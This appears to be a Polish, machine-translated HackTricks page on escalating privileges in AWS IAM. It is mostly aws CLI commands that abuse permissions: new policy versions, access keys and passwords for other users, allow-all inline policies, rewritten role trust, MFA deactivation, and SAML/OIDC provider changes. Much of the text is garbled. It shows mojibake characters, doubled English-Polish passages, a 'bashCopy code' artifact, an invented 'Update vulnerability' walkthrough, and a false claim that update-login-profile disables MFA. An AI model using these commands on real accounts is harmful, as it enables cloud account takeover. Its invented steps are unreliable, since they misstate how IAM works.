# AWS - Eskalacja uprawnieÅ„ IAM

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## IAM

Aby uzyskaÄ‡ wiÄ™cej informacji na temat IAM, sprawdÅº:

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### **`iam:CreatePolicyVersion`**

Nadaje moÅ¼liwoÅ›Ä‡ tworzenia nowej wersji polityki IAM, omijajÄ…c potrzebÄ™ posiadania uprawnienia `iam:SetDefaultPolicyVersion` za pomocÄ… flagi `--set-as-default`. Pozwala to na definiowanie niestandardowych uprawnieÅ„.

**Polecenie wykorzystujÄ…ce podatnoÅ›Ä‡:**
```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
**WpÅ‚yw:** BezpoÅ›rednio zwiÄ™ksza uprawnienia, umoÅ¼liwiajÄ…c wykonanie dowolnej akcji na dowolnym zasobie.

### **`iam:SetDefaultPolicyVersion`**

Pozwala zmieniÄ‡ domyÅ›lnÄ… wersjÄ™ polityki IAM na innÄ… istniejÄ…cÄ… wersjÄ™, potencjalnie zwiÄ™kszajÄ…c uprawnienia, jeÅ›li nowa wersja ma wiÄ™cej uprawnieÅ„.

**Polecenie Bash:**
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
```
**WpÅ‚yw:** PoÅ›rednie eskalowanie uprawnieÅ„ poprzez wÅ‚Ä…czenie wiÄ™kszej liczby uprawnieÅ„.

### **`iam:CreateAccessKey`**

UmoÅ¼liwia tworzenie identyfikatora klucza dostÄ™pu (access key ID) oraz tajnego klucza dostÄ™pu (secret access key) dla innego uÅ¼ytkownika, co prowadzi do potencjalnego eskalowania uprawnieÅ„.

**Wykorzystanie:**
```bash
aws iam create-access-key --user-name <target_user>
```
**WpÅ‚yw:** BezpoÅ›rednie eskalowanie uprawnieÅ„ poprzez przejÄ™cie rozszerzonych uprawnieÅ„ innego uÅ¼ytkownika.

### **`iam:CreateLoginProfile` | `iam:UpdateLoginProfile`**

UmoÅ¼liwia tworzenie lub aktualizowanie profilu logowania, w tym ustawianie haseÅ‚ do logowania do konsoli AWS, co prowadzi do bezpoÅ›redniego eskalowania uprawnieÅ„.

**Wykorzystanie dla tworzenia:**
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Wykorzystanie podatnoÅ›ci Update:**

```html
<details>
<summary>Exploit</summary>

### Opis

PodatnoÅ›Ä‡ Update w usÅ‚udze AWS IAM umoÅ¼liwia eskalacjÄ™ uprawnieÅ„, umoÅ¼liwiajÄ…c atakujÄ…cemu uzyskanie wiÄ™kszych uprawnieÅ„ niÅ¼ mu przysÅ‚ugujÄ….

### Kroki

1. Zaloguj siÄ™ do konsoli AWS IAM jako uÅ¼ytkownik z uprawnieniami do zarzÄ…dzania rolami.
2. PrzejdÅº do sekcji "Roles" i wybierz rolÄ™, ktÃ³rej uprawnienia chcesz eskalowaÄ‡.
3. Kliknij przycisk "Edit trust relationship" i zmodyfikuj zaufanie roli, dodajÄ…c nowe ÅºrÃ³dÅ‚o zaufania.
4. WprowadÅº ARN atakujÄ…cego konta AWS jako nowe ÅºrÃ³dÅ‚o zaufania.
5. Zapisz zmiany i wyloguj siÄ™ z konta atakujÄ…cego.
6. Zaloguj siÄ™ ponownie do konta atakujÄ…cego i przejdÅº do konsoli AWS IAM.
7. Wybierz rolÄ™, ktÃ³rej uprawnienia zostaÅ‚y zmodyfikowane.
8. Kliknij przycisk "Switch Role" i wprowadÅº ARN roli, ktÃ³rej uprawnienia chcesz eskalowaÄ‡.
9. Zaloguj siÄ™ do roli i sprawdÅº, czy uzyskaÅ‚eÅ› wiÄ™ksze uprawnienia.

### Zabezpieczenia

Aby zabezpieczyÄ‡ siÄ™ przed tym atakiem, naleÅ¼y:

- Regularnie monitorowaÄ‡ i analizowaÄ‡ dzienniki zdarzeÅ„ AWS IAM w celu wykrycia podejrzanej aktywnoÅ›ci.
- OgraniczyÄ‡ uprawnienia uÅ¼ytkownikÃ³w i rÃ³l do niezbÄ™dnego minimum.
- Regularnie przeglÄ…daÄ‡ i aktualizowaÄ‡ zaufanie roli, aby zapobiec nieautoryzowanym zmianom.
- WÅ‚Ä…czyÄ‡ wieloskÅ‚adnikowe uwierzytelnianie (MFA) dla kont uÅ¼ytkownikÃ³w.
- Regularnie aktualizowaÄ‡ i Å‚ataÄ‡ oprogramowanie AWS IAM, aby uniknÄ…Ä‡ wykorzystania znanych podatnoÅ›ci.

</details>
```

**Uwaga:** Wykorzystywanie podatnoÅ›ci bez zgody wÅ‚aÅ›ciciela systemu jest nielegalne. Upewnij siÄ™, Å¼e masz odpowiednie uprawnienia i zezwolenia przed przeprowadzeniem jakiejkolwiek aktywnoÅ›ci zwiÄ…zanej z penetracjÄ… testowÄ….
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**WpÅ‚yw:** BezpoÅ›rednie eskalowanie uprawnieÅ„ poprzez zalogowanie siÄ™ jako "dowolny" uÅ¼ytkownik.

### **`iam:UpdateAccessKey`**

Pozwala na wÅ‚Ä…czenie wyÅ‚Ä…czonego klucza dostÄ™pu, co potencjalnie prowadzi do nieautoryzowanego dostÄ™pu, jeÅ›li atakujÄ…cy posiada wyÅ‚Ä…czony klucz.

**Wykorzystanie:**

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id <ACCESS_KEY_ID> --status Active --user-name <username>
```
{% endcode %}

**WpÅ‚yw:** BezpoÅ›rednie eskalowanie uprawnieÅ„ poprzez ponowne aktywowanie kluczy dostÄ™pu.

### **`iam:CreateServiceSpecificCredential` | `iam:ResetServiceSpecificCredential`**

UmoÅ¼liwia generowanie lub resetowanie poÅ›wiadczeÅ„ dla konkretnych usÅ‚ug AWS (np. CodeCommit, Amazon Keyspaces), dziedziczÄ…c uprawnienia powiÄ…zanego uÅ¼ytkownika.

**Wykorzystanie dla tworzenia:**

{% code overflow="wrap" %}
```bash
aws iam create-service-specific-credential --user-name <username> --service-name <service>
```
{% endcode %}

**Wykorzystanie dla Reset:**

{% code overflow="wrap" %}
```bash
aws iam reset-service-specific-credential --service-specific-credential-id <credential_id>
```
{% endcode %}

**WpÅ‚yw:** BezpoÅ›rednie eskalowanie uprawnieÅ„ w ramach uprawnieÅ„ usÅ‚ugi uÅ¼ytkownika.

### **`iam:AttachUserPolicy` || `iam:AttachGroupPolicy`**

Pozwala na doÅ‚Ä…czanie polis do uÅ¼ytkownikÃ³w lub grup, co bezpoÅ›rednio eskaluje uprawnienia poprzez dziedziczenie uprawnieÅ„ doÅ‚Ä…czonej polisy.

**Wykorzystanie dla uÅ¼ytkownika:**
```bash
aws iam attach-user-policy --user-name <username> --policy-arn "<policy_arn>"
```
**Wykorzystanie dla grupy:**
```bash
aws iam attach-group-policy --group-name <group_name> --policy-arn "<policy_arn>"
```
**WpÅ‚yw:** BezpoÅ›rednie eskalowanie uprawnieÅ„ do wszystkiego, co polityka przyznaje.

### **`iam:AttachRolePolicy`,** ( `sts:AssumeRole`|`iam:createrole`) | **`iam:PutUserPolicy` | `iam:PutGroupPolicy` | `iam:PutRolePolicy`**

UmoÅ¼liwia doÅ‚Ä…czanie lub dodawanie polityk do rÃ³l, uÅ¼ytkownikÃ³w lub grup, umoÅ¼liwiajÄ…c bezpoÅ›rednie eskalowanie uprawnieÅ„ poprzez przyznanie dodatkowych uprawnieÅ„.

**Wykorzystanie dla roli:**
```bash
bashCopy codeaws iam attach-role-policy --role-name <role_name> --policy-arn "<policy_arn>"
```
**Wykorzystanie dla polityk Inline:**

Inline policies are policies that are directly attached to an IAM user, group, or role. These policies are defined within the same JSON document as the user, group, or role, rather than being managed separately. This makes them a potential target for privilege escalation.

Polityki Inline to polityki, ktÃ³re sÄ… bezpoÅ›rednio doÅ‚Ä…czone do uÅ¼ytkownika IAM, grupy lub roli. Polityki te sÄ… definiowane w tym samym dokumencie JSON co uÅ¼ytkownik, grupa lub rola, zamiast byÄ‡ zarzÄ…dzane oddzielnie. Sprawia to, Å¼e sÄ… potencjalnym celem eskalacji uprawnieÅ„.

To exploit an inline policy, you need to have the necessary permissions to modify the policy document. Once you have access to modify the policy, you can add additional permissions to the policy that grant you higher privileges.

Aby wykorzystaÄ‡ politykÄ™ Inline, musisz mieÄ‡ odpowiednie uprawnienia do modyfikacji dokumentu polityki. Po uzyskaniu dostÄ™pu do modyfikacji polityki, moÅ¼esz dodaÄ‡ dodatkowe uprawnienia do polityki, ktÃ³re przyznajÄ… Ci wyÅ¼sze uprawnienia.

Here are the steps to exploit an inline policy:

Oto kroki do wykorzystania polityki Inline:

1. Identify the IAM user, group, or role that has an inline policy attached.
2. Determine the permissions granted by the existing inline policy.
3. Gain access to modify the policy document.
4. Add additional permissions to the policy document that grant you higher privileges.
5. Save the modified policy document.
6. Test the modified policy to ensure it grants you the desired privileges.
7. Exploit the higher privileges granted by the modified policy.

1. Zidentyfikuj uÅ¼ytkownika IAM, grupÄ™ lub rolÄ™, ktÃ³ra ma doÅ‚Ä…czonÄ… politykÄ™ Inline.
2. OkreÅ›l uprawnienia przyznane przez istniejÄ…cÄ… politykÄ™ Inline.
3. Uzyskaj dostÄ™p do modyfikacji dokumentu polityki.
4. Dodaj dodatkowe uprawnienia do dokumentu polityki, ktÃ³re przyznajÄ… Ci wyÅ¼sze uprawnienia.
5. Zapisz zmodyfikowany dokument polityki.
6. Przetestuj zmodyfikowanÄ… politykÄ™, aby upewniÄ‡ siÄ™, Å¼e przyznaje Ci poÅ¼Ä…dane uprawnienia.
7. Wykorzystaj wyÅ¼sze uprawnienia przyznane przez zmodyfikowanÄ… politykÄ™.
```bash
aws iam put-user-policy --user-name <username> --policy-name "<policy_name>" \
--policy-document "file:///path/to/policy.json"

aws iam put-group-policy --group-name <group_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json

aws iam put-role-policy --role-name <role_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json
```
MoÅ¼esz uÅ¼yÄ‡ polityki takiej jak:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"*"
],
"Resource": [
"*"
]
}
]
}
```
**WpÅ‚yw:** BezpoÅ›rednie eskalowanie uprawnieÅ„ poprzez dodawanie uprawnieÅ„ za pomocÄ… polityk.

### **`iam:AddUserToGroup`**

UmoÅ¼liwia dodanie siebie do grupy IAM, eskalujÄ…c uprawnienia poprzez dziedziczenie uprawnieÅ„ grupy.

**Wykorzystanie:**

{% code overflow="wrap" %}
```bash
aws iam add-user-to-group --group-name <group_name> --user-name <username>
```
{% endcode %}

**WpÅ‚yw:** BezpoÅ›rednie eskalowanie uprawnieÅ„ do poziomu uprawnieÅ„ grupy.

### **`iam:UpdateAssumeRolePolicy`**

Pozwala na zmianÄ™ dokumentu polityki przyjmowania roli roli, umoÅ¼liwiajÄ…c przyjÄ™cie roli i jej powiÄ…zanych uprawnieÅ„.

**Wykorzystanie:**
```bash
aws iam update-assume-role-policy --role-name <role_name> \
--policy-document file:///path/to/assume/role/policy.json
```
Gdzie polityka wyglÄ…da nastÄ™pujÄ…co, co daje uÅ¼ytkownikowi uprawnienie do przejÄ™cia roli:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**WpÅ‚yw:** BezpoÅ›rednie eskalowanie uprawnieÅ„ poprzez przejÄ™cie uprawnieÅ„ dowolnej roli.

### **`iam:UploadSSHPublicKey` || `iam:DeactivateMFADevice`**

UmoÅ¼liwia przesyÅ‚anie klucza publicznego SSH w celu uwierzytelnienia w CodeCommit oraz dezaktywacjÄ™ urzÄ…dzeÅ„ MFA, co prowadzi do potencjalnego poÅ›redniego eskalowania uprawnieÅ„.

**Wykorzystanie dla przesyÅ‚ania klucza SSH:**
```bash
aws iam upload-ssh-public-key --user-name <username> --ssh-public-key-body <key_body>
```
**Wykorzystanie do dezaktywacji MFA:**

To exploit the MFA deactivation vulnerability, follow these steps:

1. Identify a user with the necessary IAM permissions to modify MFA settings. This user should have the `iam:UpdateLoginProfile` permission.

2. Use the `update-login-profile` command to disable MFA for the targeted user. This command can be executed using the AWS CLI or SDKs.

3. Verify that MFA has been successfully disabled by attempting to log in as the targeted user without providing the MFA code.

By exploiting this vulnerability, an attacker can bypass the MFA protection and gain unauthorized access to the targeted user's account. It is crucial to regularly review and restrict IAM permissions to prevent such privilege escalation attacks.
```bash
aws iam deactivate-mfa-device --user-name <username> --serial-number <serial_number>
```
**WpÅ‚yw:** PoÅ›rednie eskalowanie uprawnieÅ„ poprzez umoÅ¼liwienie dostÄ™pu do CodeCommit lub wyÅ‚Ä…czenie ochrony MFA.

### **`iam:ResyncMFADevice`**

Pozwala na resynchronizacjÄ™ urzÄ…dzenia MFA, co potencjalnie prowadzi do poÅ›redniego eskalowania uprawnieÅ„ poprzez manipulacjÄ™ ochronÄ… MFA.

**Polecenie Bash:**
```bash
aws iam resync-mfa-device --user-name <username> --serial-number <serial_number> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**WpÅ‚yw:** PoÅ›rednie eskalowanie uprawnieÅ„ poprzez dodawanie lub manipulowanie urzÄ…dzeniami MFA.

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

Z tymi uprawnieniami moÅ¼esz **zmieniaÄ‡ metadane XML poÅ‚Ä…czenia SAML**. NastÄ™pnie, moÅ¼esz wykorzystaÄ‡ **federacjÄ™ SAML** do **logowania siÄ™** z dowolnÄ… **rolÄ…, ktÃ³ra mu ufa**.

NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e **legitymowi uÅ¼ytkownicy nie bÄ™dÄ… w stanie siÄ™ zalogowaÄ‡**. JednakÅ¼e, moÅ¼esz uzyskaÄ‡ XML, aby mÃ³c wstawiÄ‡ swoje dane, zalogowaÄ‡ siÄ™ i przywrÃ³ciÄ‡ poprzednie ustawienia.
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
{% hint style="info" %}
TODO: NarzÄ™dzie zdolne do generowania metadanych SAML i logowania siÄ™ z okreÅ›lonÄ… rolÄ…
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(Niepewny co do tego) JeÅ›li atakujÄ…cy ma te **uprawnienia**, moÅ¼e dodaÄ‡ nowy **Thumbprint**, aby mÃ³c zalogowaÄ‡ siÄ™ do wszystkich rÃ³l ufajÄ…cych dostawcy.

{% code overflow="wrap" %}
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
{% endcode %}

## OdwoÅ‚ania

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
